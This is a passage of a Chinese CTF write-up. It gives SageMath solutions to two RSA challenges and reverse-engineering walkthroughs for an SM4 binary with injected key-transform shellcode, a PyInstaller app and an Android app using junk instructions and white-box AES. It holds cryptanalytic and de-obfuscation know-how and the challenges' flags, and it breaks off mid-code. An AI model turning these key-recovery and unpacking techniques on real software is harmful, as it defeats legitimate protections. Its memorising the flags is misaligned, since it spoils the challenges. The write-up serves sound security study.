if A.is_singular():
    print("[-] no")
else:
    sol = A.solve_right(b)
    print("[+] find：")
    print(f"x1 = {sol[0]}")
    print(f"x2 = {sol[1]}")

```

```python
N = 98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257
c1 = 40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331
c2 = 4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385

x1=17754677231116188359396131937000664637388235962309739341039576063530375612219
x2=79541650983569507936838949546074094434344869740141472134648391439474061318003

from Crypto.Util.number import *

def HGCD(a, b):
    if 2 * b.degree() <= a.degree() or a.degree() == 1:
        return 1, 0, 0, 1
    m = a.degree() // 2
    a_top, a_bot = a.quo_rem(x ^ m)
    b_top, b_bot = b.quo_rem(x ^ m)
    R00, R01, R10, R11 = HGCD(a_top, b_top)
    c = R00 * a + R01 * b
    d = R10 * a + R11 * b
    q, e = c.quo_rem(d)
    d_top, d_bot = d.quo_rem(x ^ (m // 2))
    e_top, e_bot = e.quo_rem(x ^ (m // 2))
    S00, S01, S10, S11 = HGCD(d_top, e_top)
    RET00 = S01 * R00 + (S00 - q * S01) * R10
    RET01 = S01 * R01 + (S00 - q * S01) * R11
    RET10 = S11 * R00 + (S10 - q * S11) * R10
    RET11 = S11 * R01 + (S10 - q * S11) * R11
    return RET00, RET01, RET10, RET11

def GCD(a, b):
    q, r = a.quo_rem(b)
    if r == 0:
        return b
    R00, R01, R10, R11 = HGCD(a, b)
    c = R00 * a + R01 * b
    d = R10 * a + R11 * b
    if d == 0:
        return c.monic()
    q, r = c.quo_rem(d)
    if r == 0:
        return d
    return GCD(d, r)

e = 65537
PR.<x> = PolynomialRing(Zmod(N))
f1 = x^e - c1
f2 = (x1*x + x2)^e - c2
res = GCD(f1,f2)
m = -res.monic().coefficients()[0]
print(long_to_bytes(int(m)))
```

## Strange RSA

首先发现u,v较小，导致hint函数里面的d1，d2是小私钥，用boneh脚本可以解出d1，d2进一步解出u，v

```Python
d1 = 1649010712229782299850848551980277578291258538000633837589698050054193337459137087
d2 = 1285707407708336469611922789424965876916577005852352154890635610024931952186455505
long_to_bytes(ZZ(pow(hint_ct,d2,N2)))
v2 = d1 // gcd(d1,d2) + d2 // gcd(d1,d2)
v = v2//2
u2 = d1 // gcd(d1,d2) - d2 // gcd(d1,d2)
u = u2//2
v,u
(21576, 2671)
```

观察e的生成，有等式

$$\frac{eu}{v} = \frac{w}{v} + A$$

$$e \cdot u = w + A \cdot v$$

其中e,u,v已知，A为2048bits，w为538bits

进一步变形

$$\text A = N^4 - s^4 + 4Ns^2 - 2N^2 + 1, \; s = p + q$$


考虑近似求出s，然后factor N，实际发现求出的s+1等于p+q

```Python
r = u*e3 // v
s = var("s")
f = N1^4 - s^4 + 4*N1*s^2 - 2*N1^2 + 1 - r
p_q = int(f.roots()[0][0]) + 1
x = var("x")
f = x*(p_q - x) - N1
q = int(f.roots()[0][0])
q = N1//p
assert p*q == N1
d = inverse_mod(e3,(p-1)*(q-1))
long_to_bytes(ZZ(pow(flag_ct,d,N1)))
```

# Reverse

## xuans

```C++
__int64 __fastcall sub_403A52(__int64 a1, unsigned __int8 *a2)
{
  v9 = 0LL;
  v5 = ((unsigned __int64)a2[2] << 8) | ((unsigned __int64)a2[1] << 16) | ((unsigned __int64)*a2 << 24) | a2[3];
  v6 = ((unsigned __int64)a2[6] << 8) | ((unsigned __int64)a2[5] << 16) | ((unsigned __int64)a2[4] << 24) | a2[7];
  v7 = ((unsigned __int64)a2[10] << 8) | ((unsigned __int64)a2[9] << 16) | ((unsigned __int64)a2[8] << 24) | a2[11];
  v8 = ((unsigned __int64)a2[14] << 8) | ((unsigned __int64)a2[13] << 16) | ((unsigned __int64)a2[12] << 24) | a2[15];
  v4[0] = v5 ^ 0xA3B1BAC6;
  v4[1] = v6 ^ 0x56AA3350;
  v4[2] = v7 ^ 0x677D9197;
  result = v8 ^ 0xB27022DC;
  v4[3] = v8 ^ 0xB27022DC;
  while ( v9 <= 0x1F )
  {
    v3 = v4[v9];
    v4[v9 + 4] = v3 ^ sub_40393B(LODWORD(v4[v9 + 3]) ^ (unsigned int)(LODWORD(v4[v9 + 2]) ^ LODWORD(v4[v9 + 1])) ^ dword_4AA280[2 * v9]);
    result = v4[v9 + 4];
    *(_QWORD *)(8 * v9++ + a1) = result;
  }
  return result;
}
```

从上面的轮加密很容易看出来对于flag的加密逻辑是SM4，前面对SM4的key进行了一系列的操作，如下

```JavaScript
if ( v45 )
  {
    sub_436CA0(500LL);
    v27 = 0LL;
    v28[0] = 0xE87D8948E5894855LL;
    v28[1] = 0xEB0000000FFC45C7LL;
    v28[2] = 0x48D06348FC458B3ALL;
    v28[3] = 0xB60FD00148E8458BLL;
    v28[4] = 0x8D489848FC458B30LL;
    v28[5] = 0x148E8458B48FF50LL;
    v28[6] = 0x48FC458B08B60FD0LL;
    v28[7] = 0x148E8458B48D063LL;
    v28[8] = 0x831088F289CE31D0LL;
    v29[0] = 0x7F00FC7D8301FC6DLL;
    *(_QWORD *)((char *)v29 + 7) = 0xC35D9090C07FLL;
    v44 = v45;
    sub_436B50(16LL, v45, 0LL, 0LL, v2, v3, a2);
    sub_435AC0(0LL);
    v43 = sub_402839(-1, (char)"libc.so", v4, v5, v6, v7);
    v42 = sub_402839(v45, (char)"libc.so", (__int64)"libc.so", v8, v9, v10);
    v41 = (__int64)sub_436A40 + v42 - v43;
    v40 = (__int64)sub_420E20 + v42 - v43;
    v25[0] = 0LL;
    v25[1] = 0x4000LL;
    v25[2] = 7LL;
    v25[3] = 34LL;
    v26 = 0uLL;
    sub_402AD3(v45, (__int64)v33, (__int64)v33, v11, v12, v13);
    sub_402AD3(v44, (__int64)&v30, (__int64)&v30, v14, v15, v16);
    sub_402B16(v44, v41, v25, 6LL, &v30);
    v39 = v32;
    sub_402729(v44, (__int64)v28, v32, 87);
    sub_402729(v44, (__int64)SM4_Key, v39 + 256, 16);
    v36 = v39 + 256;
    sub_402B16(v44, v39, &v36, 1LL, &v30);
    sub_40262A(v44, (__int64)SM4_Key, v32 - 1, 17);
    sub_402729(v44, (__int64)SM4_Key, (__int64)SM4_Key, 17);
    v34 = -23;
    v35 = sub_40320C(v40);
    sub_402729(v44, (__int64)&v34, v40, 5);
    sub_402A90(v44, (__int64)v33, (__int64)v33, v17, v18, v19);
    sub_402A1B(v44, (__int64)v33, v20, v21, v22, v23);
    sub_406C80(v45, 18);
    sub_435B80(v45, 0LL, 0LL);
    sub_4071A0(0LL);
  }
```

写个脚本提出来shellcode

```JavaScript
shellcode_chunks = [
    0xE87D8948E5894855,
    0xEB0000000FFC45C7,
    0x48D06348FC458B3A,
    0xB60FD00148E8458B,
    0x8D489848FC458B30,
    0x148E8458B48FF50,
    0x48FC458B08B60FD0,
    0x148E8458B48D063,
    0x831088F289CE31D0,
    0x7F00FC7D8301FC6D,
    0xC35D9090C07F
]

with open("shellcode.bin", "wb") as f:
    for chunk in shellcode_chunks:
        f.write(chunk.to_bytes(8, byteorder='little'))
```

ida反汇编得到

```JavaScript
                                        push    rbp
seg000:0000000000000001                 mov     rbp, rsp
seg000:0000000000000004                 mov     [rbp+var_18], rdi
seg000:0000000000000008                 mov     [rbp+var_4], 0Fh
seg000:000000000000000F                 jmp     short loc_4B
seg000:0000000000000011 ; ---------------------------------------------------------------------------
seg000:0000000000000011                 mov     eax, [rbp+var_4]
seg000:0000000000000014                 movsxd  rdx, eax
seg000:0000000000000017                 mov     rax, [rbp+var_18]
seg000:000000000000001B                 add     rax, rdx
seg000:000000000000001E                 movzx   esi, byte ptr [rax]
seg000:0000000000000021                 mov     eax, [rbp+var_4]
seg000:0000000000000024                 cdqe
seg000:0000000000000026                 lea     rdx, [rax-1]
seg000:000000000000002A                 mov     rax, [rbp+var_18]
seg000:000000000000002E                 add     rax, rdx
seg000:0000000000000031                 movzx   ecx, byte ptr [rax]
seg000:0000000000000034                 mov     eax, [rbp+var_4]
seg000:0000000000000037                 movsxd  rdx, eax
seg000:000000000000003A                 mov     rax, [rbp+var_18]
seg000:000000000000003E                 add     rax, rdx
seg000:0000000000000041                 xor     esi, ecx
seg000:0000000000000043                 mov     edx, esi
seg000:0000000000000045                 mov     [rax], dl
seg000:0000000000000047                 sub     [rbp+var_4], 1
seg000:000000000000004B
seg000:000000000000004B loc_4B:                                 ; CODE XREF: sub_0+F↑j
seg000:000000000000004B                 cmp     [rbp+var_4], 0
seg000:000000000000004F                 jg      short near ptr 0D0h
seg000:0000000000000051                 rcl     byte ptr [rax+0C35D90h], 0
```

很明显的循环异或逻辑，从最后一位一直向前异或，写个脚本模拟一下得到真正的key

```C++
#include <stdio.h>
int main() 
{
    unsigned char a[16] = 
        {
        0x39, 0x5A, 0x3B, 0x5D,
        0x3C, 0x0A, 0x3E, 0x08,
        0x3E, 0x5F, 0x6F, 0x5D,
        0x65, 0x07, 0x61, 0x03
    };
    for (int i = 16; i >=0; i--) 
        a[i] ^= a[i - 1];
    for (int i = 0; i < 16; ++i) 
        printf("%.2X",a[i]);
    printf("\n");
    return 0;
}
```

解完得到39 63 61 66 61 36 34 36 36 61 30 32 38 62 66 62 

然后赛博厨子解得假flag

![img](6b02f1ab-2046-415d-907b-1c4bfa227df5.png)

然后卡住了挺长时间的，猜想通过ptrace改了密文，翻阅函数看到了方程组

```C
BOOL8 __fastcall sub_4019A5(unsigned __int8 *a1)
{
  if ( 118 * a1[2] + 173 * *a1 + 48 * a1[1] + 193 * a1[3] != 66131 )
    return 1LL;
  if ( 196 * a1[1] + 68 * *a1 + 104 * a1[2] + 10 * a1[3] != 52620 )
    return 1LL;
  if ( 88 * a1[2] + 22 * *a1 + 37 * a1[1] + 71 * a1[3] != 36011 )
    return 1LL;
  if ( 59 * a1[2] + 141 * a1[1] + 89 * *a1 + 194 * a1[3] != 61842 )
    return 1LL;
  if ( 175 * a1[6] + 88 * a1[5] + 40 * a1[4] + 89 * a1[7] != 65258 )
    return 1LL;
  if ( 26 * a1[6] + 166 * a1[5] + 82 * a1[4] + 78 * a1[7] != 58176 )
    return 1LL;
  if ( 149 * a1[6] + 73 * a1[4] + 10 * a1[5] + 116 * a1[7] != 62478 )
    return 1LL;
  if ( 176 * a1[6] + 198 * a1[4] + 80 * a1[5] + 193 * a1[7] != 114069 )
    return 1LL;
  if ( 178 * a1[10] + 100 * a1[9] + 83 * a1[8] + 30 * a1[11] != 56170 )
    return 1LL;
  if ( 143 * a1[10] + 148 * (a1[8] + a1[9]) + 168 * a1[11] != 70647 )
    return 1LL;
  if ( 33 * a1[8] + 194 * a1[9] + 10 * a1[10] + 186 * a1[11] != 53174 )
    return 1LL;
  if ( 32 * a1[10] + (a1[8] << 7) + 33 * a1[9] + 152 * a1[11] != 26118 )
    return 1LL;
  if ( 184 * a1[14] + 115 * a1[13] + 164 * a1[12] + 29 * a1[15] != 81254 )
    return 1LL;
  if ( 129 * a1[13] + 35 * a1[12] + 129 * a1[14] + 165 * a1[15] != 78646 )
    return 1LL;
  if ( 134 * a1[13] + 54 * a1[12] + 39 * a1[14] + 18 * a1[15] != 29827 )
    return 1LL;
  if ( 106 * a1[14] + 133 * a1[13] + 80 * a1[12] + 43 * a1[15] != 53660 )
    return 1LL;
  if ( 121 * a1[18] + 187 * a1[16] + 32 * a1[17] + 2 * a1[19] != 24667 )
    return 1LL;
  if ( 170 * a1[17] + 66 * a1[16] + 58 * a1[18] + 36 * a1[19] != 44188 )
    return 1LL;
  if ( 103 * a1[16] + 120 * a1[17] + 12 * a1[18] + 175 * a1[19] != 52310 )
    return 1LL;
  if ( 83 * a1[16] + 92 * a1[17] + 129 * a1[18] + 143 * a1[19] != 46020 )
    return 1LL;
  if ( 141 * a1[22] + 54 * a1[21] + 100 * a1[20] + 122 * a1[23] != 66732 )
    return 1LL;
  if ( 85 * a1[21] + 171 * a1[20] + 69 * a1[22] + 7 * a1[23] != 46817 )
    return 1LL;
  if ( (a1[22] << 7) + 197 * a1[20] + 48 * a1[21] + 132 * a1[23] != 83536 )
    return 1LL;
  if ( 181 * a1[21] + 101 * a1[20] + 79 * a1[22] + 144 * a1[23] != 80587 )
    return 1LL;
  if ( 149 * a1[24] + 187 * a1[25] + 24 * a1[26] + 142 * a1[27] != 92687 )
    return 1LL;
  if ( 49 * a1[26] + 86 * a1[25] + 118 * a1[24] + 50 * a1[27] != 49285 )
    return 1LL;
  if ( 164 * a1[26] + 170 * a1[25] + 70 * a1[24] + 193 * a1[27] != 92711 )
    return 1LL;
  if ( 95 * a1[26] + 198 * a1[25] + 96 * a1[24] + a1[27] != 61904 )
    return 1LL;
  if ( 114 * a1[28] + 179 * a1[29] + 37 * a1[30] + 163 * a1[31] != 53864 )
    return 1LL;
  if ( 132 * a1[30] + 94 * a1[29] + 49 * a1[28] + 99 * a1[31] != 36980 )
    return 1LL;
  if ( 150 * a1[30] + 113 * a1[29] + 43 * a1[28] + (a1[31] << 7) == 40829 )
    return 115 * a1[30] + 139 * a1[29] + a1[28] + 44 * a1[31] != 22448;
  return 1LL;
}
```

z3脚本如下

```Python
from z3 import *
import itertools

def solve_group(idx, equations):
    vars = [Int(f'a{idx * 4 + i}') for i in range(4)]
    s = Solver()

    for coeffs, result in equations:
        s.add(Sum([c * v for c, v in zip(coeffs, vars)]) == result)

    solutions = []
    while s.check() == sat:
        m = s.model()
        solution = [m[v].as_long() for v in vars]
        solutions.append(tuple(solution))
        s.add(Or([v != m[v] for v in vars])) 
    return solutions

groups = [
    {'equations': [([173, 48, 118, 193], 66131), ([68, 196, 104, 10], 52620),
                   ([22, 37, 88, 71], 36011), ([89, 141, 59, 194], 61842)]},
    {'equations': [([40, 88, 175, 89], 65258), ([82, 166, 26, 78], 58176),
                   ([73, 10, 149, 116], 62478), ([198, 80, 176, 193], 114069)]},
    {'equations': [([83, 100, 178, 30], 56170), ([148, 148, 143, 168], 70647),
                   ([33, 194, 10, 186], 53174), ([128, 33, 32, 152], 26118)]},
    {'equations': [([164, 115, 184, 29], 81254), ([35, 129, 129, 165], 78646),
                   ([54, 134, 39, 18], 29827), ([80, 133, 106, 43], 53660)]},
    {'equations': [([187, 32, 121, 2], 24667), ([66, 170, 58, 36], 44188),
                   ([103, 120, 12, 175], 52310), ([83, 92, 129, 143], 46020)]},
    {'equations': [([100, 54, 141, 122], 66732), ([171, 85, 69, 7], 46817),
                   ([197, 48, 128, 132], 83536), ([101, 181, 79, 144], 80587)]},
    {'equations': [([149, 187, 24, 142], 92687), ([118, 86, 49, 50], 49285),
                   ([70, 170, 164, 193], 92711), ([96, 198, 95, 1], 61904)]},
    {'equations': [([114, 179, 37, 163], 53864), ([49, 94, 132, 99], 36980),
                   ([1, 139, 115, 44], 22448), ([43, 113, 150, 128], 40829)]},
]

all_solutions = []
for i, group in enumerate(groups):
    sols = solve_group(i, group['equations'])
    if not sols:
        print(f"第 {i} 组无解")
        exit()
    print(f"第 {i} 组找到 {len(sols)} 个解")
    all_solutions.append(sols)

full_solutions = list(itertools.product(*all_solutions))
print(f"\n总共组合出 {len(full_solutions)} 个完整解")

for idx, sol in enumerate(full_solutions, 1):
    flat = [v for group in sol for v in group]

    print(f"\n解 {idx}:")
    for i in range(0, 32, 8):
        line = ' '.join(f"{flat[j]:3d}" for j in range(i, i + 8))
        print(f"  {line}")

    hex_line = ''.join(f"{b:02x}" for b in flat)
    print(f"{hex_line}")
```

得到：1d7fea8e9b8991f350e69118d732b3fc49c12679a87162f6a1d42dc5e43b5956

![img](18193d0b-9fd9-4ec0-97e1-a2cd1c284fc3.png)

猜测是真正的密文，尝试解密

![img](52464938-efca-4ecb-926e-459e1644ac83.png)

解得flag，flag为：DASCTF{9d78b5507187421a48de8f6ef24a8d4b}

## 鱼音乐

exe很明显pyinstaller打包的，解包找到main.pyc和xianyu_decrypt.cp38-win_amd64.pyd，pylingual反编译pyc可知是python3.8

核心代码如下

```Python
info = load_and_decrypt_xianyu(file_path)
meta = info['meta']
cover_path = info['cover_path']
audio_path = info['audio_path']
if cover_path and os.path.exists(cover_path):
    pixmap = QPixmap(cover_path)
    self.cover_label.setPixmap(pixmap)
else:
    self.cover_label.setText('无封面')
url = QUrl.fromLocalFile(audio_path)
self.player.setMedia(QMediaContent(url))
self.player.play()
name = meta.get('name', '未知')
artist = meta.get('artist', '未知歌手')
fl4g = meta.get('fl4g', 'where_is_the_flag?')
```

把pyd拿过来和main、xianyu后缀文件放同一目录动态调试即可得到flag

![img](e96f1a83-4c5a-4528-ae97-133dfd00956b.png)

flag是DASCTF{fl5h_mus1c_miao_m1a0_mlaO}

## 更适合CTF宝宝体质的app

java层是假的flag（tea加密）

so层分析后发现还是arm好读，里面有几个函数开头有花指令

![img](ade9d6f8-05b9-45bf-95f7-111d4196fdfb.png)

分析可以发现在跳转BR X8后的代码反汇编失败，分析X8值，首先是X8=(1^0xAB^0xC7)-0x6C=1，然后X8=X9+X12*X8=0x4028+0x14=0x403C，所以实际上实现了一个计算跳转地址，中间所有的都是花指令，直接IDA nop即可

去花后可以反编译，根据JNI_OnLoad找到Check函数如下

```C++
bool __fastcall sub_3A9C(__int64 a1)
{
  _BOOL4 v3; // [xsp+3Ch] [xbp-144h]
  _OWORD v4[2]; // [xsp+40h] [xbp-140h] BYREF
  _BYTE v5[64]; // [xsp+60h] [xbp-120h] BYREF
  _OWORD s1[2]; // [xsp+150h] [xbp-30h] BYREF
  __int64 v7; // [xsp+178h] [xbp-8h]

  v7 = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  s1[1] = xmmword_D84;
  s1[0] = xmmword_D74;
  memset(v4, 0, sizeof(v4));
  sub_3FD0(a1, v5);
  sub_3FD0(a1 + 16, &v5[16]);
  sub_37F0(v5, v4, 0x20uLL, 0x6C6F7665);
  v3 = memcmp(s1, v4, 0x20uLL) == 0;
  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  return v3;
}
__int64 __fastcall sub_3FD0(__int64 a1, __int64 a2)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  v17 = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  memset(v16, 0, sizeof(v16));
  memset(v15, 0, sizeof(v15));
  memset(s, 0, sizeof(s));
  __memcpy_chk(v16, &unk_6FA4, 163840LL, 163840LL);
  __memcpy_chk(v15, &unk_2EFA4, 4096LL, 4096LL);
  __memcpy_chk(s, &unk_2FFA4, 221184LL, 221184LL);
  __memcpy_chk(v13, a1, 16LL, 16LL);
  for ( i = 0; i <= 8; ++i )
  {
    shift(v13);
    for ( j = 0; j <= 3; ++j )
    {
      v8 = *&v16[0x4000 * i + 1024 * (4 * j) + 4 * v13[4 * j]];
      v7 = *&v16[0x4000 * i + 1024 * ((4 * j) | 1) + 4 * v13[(4 * j) | 1]];
      v6 = *&v16[0x4000 * i + 1024 * ((4 * j) | 2) + 4 * v13[(4 * j) | 2]];
      v5 = *&v16[0x4000 * i + 1024 * ((4 * j) | 3) + 4 * v13[(4 * j) | 3]];
      v4 = 24 * j;
      v13[4 * j] = *(&s[1536 * i
                      + 16 * (24 * j + 5)
                      + *(&s[1536 * i + 16 * (24 * j + 2) + (HIBYTE(v8) & 0xF)] + (HIBYTE(v7) & 0xF))]
                   + *(&s[1536 * i + 16 * (24 * j + 3) + (HIBYTE(v6) & 0xF)] + (HIBYTE(v5) & 0xF))) | (16 * *(&s[1536 * i + 16 * (24 * j + 4) + *(&s[1536 * i + 16 * (24 * j) + (v8 >> 28)] + (v7 >> 28))] + *(&s[1536 * i + 16 * (24 * j + 1) + (v6 >> 28)] + (v5 >> 28))));
      v13[(4 * j) | 1] = *(&s[1536 * i
                            + 16 * (v4 + 11)
                            + *(&s[1536 * i + 16 * (24 * j + 8) + (BYTE2(v8) & 0xF)] + (BYTE2(v7) & 0xF))]
                         + *(&s[1536 * i + 16 * (24 * j + 9) + (BYTE2(v6) & 0xF)] + (BYTE2(v5) & 0xF))) | (16 * *(&s[1536 * i + 16 * (v4 + 10) + *(&s[1536 * i + 16 * (24 * j + 6) + ((v8 >> 20) & 0xF)] + ((v7 >> 20) & 0xF))] + *(&s[1536 * i + 16 * (24 * j + 7) + ((v6 >> 20) & 0xF)] + ((v5 >> 20) & 0xF))));
      v13[(4 * j) | 2] = *(&s[1536 * i
                            + 16 * (v4 + 17)
                            + *(&s[1536 * i + 16 * (24 * j + 14) + ((v8 >> 8) & 0xF)] + ((v7 >> 8) & 0xF))]
                         + *(&s[1536 * i + 16 * (24 * j + 15) + ((v6 >> 8) & 0xF)] + ((v5 >> 8) & 0xF))) | (16 * *(&s[1536 * i + 16 * (v4 + 16) + *(&s[1536 * i + 16 * (24 * j + 12) + (v8 >> 12)] + (v7 >> 12))] + *(&s[1536 * i + 16 * (24 * j + 13) + (v6 >> 12)] + (v5 >> 12))));
      v13[(4 * j) | 3] = *(&s[1536 * i
                            + 16 * (24 * j + 23)
                            + *(&s[1536 * i + 16 * (24 * j + 20) + (v8 & 0xF)] + (v7 & 0xF))]
                         + *(&s[1536 * i + 16 * (24 * j + 21) + (v6 & 0xF)] + (v5 & 0xF))) | (16
                                                                                            * *(&s[1536 * i
                                                                                                 + 16 * (24 * j + 22)
                                                                                                 + *(&s[1536 * i + 16 * (24 * j + 18) + (v8 >> 4)] + (v7 >> 4))]
                                                                                              + *(&s[1536 * i + 16 * (24 * j + 19) + (v6 >> 4)]
                                                                                                + (v5 >> 4))));
    }
  }
  result = shift(v13);
  for ( k = 0; k <= 15; ++k )
    *(a2 + k) = v15[256 * k + v13[k]];
  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  return result;
}
__int64 __fastcall sub_37F0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 result; // x0
  unsigned __int64 i; // [xsp+8h] [xbp-38h]
  int v9; // [xsp+34h] [xbp-Ch] BYREF
  __int64 v10; // [xsp+38h] [xbp-8h]

  v10 = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  v9 = a4;
  result = sub_3750(&v9, 4uLL);
  for ( i = 0LL; i < a3; ++i )
    *(a2 + i) = *(a1 + i) ^ (result >> (8 * (i & 3)));
  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  return result;
}
__int64 __fastcall sub_3750(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [xsp+10h] [xbp-20h]
  unsigned int v4; // [xsp+1Ch] [xbp-14h]

  (loc_3678)();
  v4 = -1;
  for ( i = 0LL; i < a2; ++i )
    v4 = dword_65FB8[(v4 ^ *(a1 + i))] ^ (v4 >> 8);
  return ~v4;
}
void Java_com_example_test_MainActivity_Get()
{
  int j; // [xsp+4h] [xbp-2Ch]
  unsigned int v1; // [xsp+8h] [xbp-28h]
  int i; // [xsp+Ch] [xbp-24h]

  __break(1u);
  if ( !dword_65FB4 )
  {
    for ( i = 0; i < 256; ++i )
    {
      v1 = i;
      for ( j = 0; j < 8; ++j )
      {
        if ( (v1 & 1) != 0 )
          v1 = (v1 >> 1) ^ 0xEDB88320;
        else
          v1 >>= 1;
      }
      dword_65FB8[i] = v1;
    }
    dword_65FB4 = 1;
  }
}
```

分析可知s1是密文，sub_3FD0是白盒AES（很大的查表操作），sub_37F0是带有crc的异或加密

首先分析crc加密，使用了dword_65FB8来查表计算，交叉引用发现在Java_com_example_test_MainActivity_Get进行了初始化，可以直接模拟逻辑生成。

```Python
def init_crc_table():
    crc_table = [0] * 256
    for i in range(256):
        x = i
        for _ in range(8):
            if x & 1:
                x = (x >> 1) ^ 0xEDB88320
            else:
                x >>= 1
        crc_table[i] = x
    return crc_table

crc_table = init_crc_table()

def compute_crc(data):
    crc = 0xFFFFFFFF
    for byte in data:
        crc = (crc >> 8) ^ crc_table[(crc ^ byte) & 0xFF]
    return crc ^ 0xFFFFFFFF

key_crc = compute_crc(b'love'[::-1])


def invert_sub_37F0(s1, key_crc):
    v5 = bytearray(32)
    for i in range(32):
        shift = 8 * (i % 4)
        v5[i] = s1[i] ^ ((key_crc >> shift) & 0xFF)
    return bytes(v5)

s = list(bytes.fromhex("0BCF797EC7EA5F31BCEEE70B1E91AADD6F07C1103675200632E3D066B87DFC90"))
v5 = invert_sub_37F0(s, key_crc)
print(v5.hex())    # df59d8a5137cfeea687846d0ca070b06bb9160cbe2e381dde67571bd6ceb5d4b
```

然后是白盒AES，需要提取密钥，关注到sub_3FD0中的unk_6FA4大小是163840，正好是4*10*16*256，unk_2EFA4大小是4096，正好是16*256，结合aes白盒板子要得到tyibox和tbox，idc提取数据填入即可

```Python
import idc
import ida_bytes

# 参数配置
base = 0x6FA4
dim1, dim2, dim3 = 10, 16, 256
total_u32 = dim1 * dim2 * dim3
byte_count = total_u32 * 4

# 目标输出路径（注意 Windows 路径反斜杠）
output_path = r"tyibox.txt"

# 读取内存块
data = ida_bytes.get_bytes(base, byte_count)
if data is None:
    print("读取地址失败！请检查地址是否有效。")
else:
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write("uint32_t tyibox[10][16][256] = {\n")
        idx = 0
        for i in range(dim1):
            f.write("  {\n")  # tyibox[i]
            for j in range(dim2):
                f.write("    {")
                line = ""
                for k in range(dim3):
                    offset = idx * 4
                    u32val = int.from_bytes(data[offset:offset+4], byteorder='little')
                    line += f"0x{u32val:08X}, "
                    idx += 1
                # 去掉结尾多余逗号
                line = line.rstrip(", ")
                f.write(line)
                f.write("},\n")
            f.write("  },\n")
        f.write("};\n")
    print(f"导出成功！已写入到: {output_path}")
    
    import idc
import ida_bytes

# 参数配置
base = 0x2EFA4  # 对应 unk_2EFA4
dim1, dim2 = 16, 256
total_bytes = dim1 * dim2

# 输出文件路径
output_path = r"tbox.txt"

# 读取字节数据
data = ida_bytes.get_bytes(base, total_bytes)
if data is None:
    print(f"读取地址 0x{base:X} 失败！")
else:
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write("uint8_t tbox[16][256] = {\n")
        for i in range(dim1):
            f.write("  {")
            row = ""
            for j in range(dim2):
                val = data[i * dim2 + j]
                row += f"0x{val:02X}, "
            row = row.rstrip(", ")  # 去掉最后一个逗号
            f.write(row)
            f.write("},\n")
        f.write("};\n")
    print(f"导出成功，写入到: {output_path}")
#include<iostream>
#include<cstdlib>
#include<cmath>
#include<string>
#include<windows.h>
using namespace std;
#include <stdio.h>
#include <string.h>
typedef unsigned char u8;
typedef unsigned int u32;

u8 gmul(u8 ap, u8 bp) {
  u8 p = 0, a = ap, b = bp;
  while (a != 0 && b != 0) {
    if (b & 1 != 0) p ^= a;
    if ((a & 0x80) != 0)
      a = (a << 1) ^ 0x1b;
    else
      a <<= 1;
    b >>= 1;
  }
  return p & 0xFF;
}

void shiftRows(u8 state[16]) {
  u8 tmp = state[1];
  state[1] = state[5];
  state[5] = state[9];
  state[9] = state[13];
  state[13] = tmp;
  tmp = state[2];
  state[2] = state[10];
  state[10] = tmp;
  tmp = state[6];
  state[6] = state[14];
  state[14] = tmp;
  tmp = state[15];
  state[15] = state[11];
  state[11] = state[7];
  state[7] = state[3];
  state[3] = tmp;
}
void add_round_shiftkey(u8 state[16], u32 expandedKey[4]) {
  for (int i = 0; i < 4; i++)
    for (int j = 0; j < 4; j++)
      state[i * 4 + j] ^= (expandedKey[(j + i) % 4] >> (24 - 8 * j)) & 0xFF;
}
void add_round_key(u8 state[16], u32 expandedKey[4]) {
  for (int i = 0; i < 4; i++)
    for (int j = 0; j < 4; j++)
      state[i * 4 + j] ^= (expandedKey[i] >> (24 - 8 * j)) & 0xFF;
}

void getXorTable(u8 table[16][16]) {
  for (int i = 0; i < 16; i++)
    for (int j = 0; j < 16; j++)
      table[i][j] = i ^ j;
}
void getTyiTable(u8 table[4][256][4]) {
  for (int i = 0; i < 256; i++) {
    table[0][i][0] = gmul(i, 0x02);
    table[0][i][1] = gmul(i, 0x03);
    table[0][i][2] = i;
    table[0][i][3] = i;
    table[1][i][0] = i;
    table[1][i][1] = gmul(i, 0x02);
    table[1][i][2] = gmul(i, 0x03);
    table[1][i][3] = i;
    table[2][i][0] = i;
    table[2][i][1] = i;
    table[2][i][2] = gmul(i, 0x02);
    table[2][i][3] = gmul(i, 0x03);
    table[3][i][0] = gmul(i, 0x03);
    table[3][i][1] = i;
    table[3][i][2] = i;
    table[3][i][3] = gmul(i, 0x02);
  }
}
void getTyiBox(u8 tbox[10][16][256], u32 tyibox[9][16][256]) {
  u8 tyitable[4][256][4] = {0};
  getTyiTable(tyitable);
  for (int r = 0; r < 9; r++)
    for (int x = 0; x < 256; x++)
      for (int j = 0; j < 4; j++)
        for (int i = 0; i < 4; i++) {
          u32 v0 = tyitable[0][tbox[r][j * 4 + i][x]][i];
          u32 v1 = tyitable[1][tbox[r][j * 4 + i][x]][i];
          u32 v2 = tyitable[2][tbox[r][j * 4 + i][x]][i];
          u32 v3 = tyitable[3][tbox[r][j * 4 + i][x]][i];
          tyibox[r][j * 4 + i][x] = (v0 << 24) | (v1 << 16) | (v2 << 8) | v3;
        }
}
u32 tyibox[10][16][256] = {...};    //太长略去

u8 tbox[16][256] = {...};

int index = 0;

void aes_encrypt_by_table(u8 input[16], int isDFA) {

  u32 a, b, c, d, aa, bb, cc, dd;
  u8 xortable[16][16] = {0};
  

